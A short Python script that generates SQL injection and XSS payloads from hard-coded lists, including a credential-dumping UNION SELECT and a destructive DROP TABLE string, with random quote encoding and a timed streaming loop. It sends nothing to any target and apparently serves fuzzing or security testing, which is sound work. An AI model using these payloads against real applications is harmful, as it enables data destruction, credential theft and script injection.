import random
import time

# Basic SQLi payloads
sqli_bases = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "1' UNION SELECT username, password FROM users --"
]

# Basic XSS payloads
xss_bases = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>"
]

def generate_payload(attack_type='sqli'):
    if attack_type == 'sqli':
        base = random.choice(sqli_bases)
    else:
        base = random.choice(xss_bases)
    # Simple mutation for variety (e.g., encoding)
    if random.random() > 0.5:
        base = base.replace("'", "%27")  # URL encode quote
    return base

# Real-time generation loop (simulate streaming)
def real_time_generator(num_payloads=10, delay=1):
    for _ in range(num_payloads):
        attack_type = random.choice(['sqli', 'xss'])
        payload = generate_payload(attack_type)
        print(f"Generated {attack_type.upper()} payload: {payload}")
        yield payload, attack_type  # Yield for integration
        time.sleep(delay)  # Simulate real-time delay

# Test it
if __name__ == "__main__":
    for _ in real_time_generator(5, 0.5):
        pass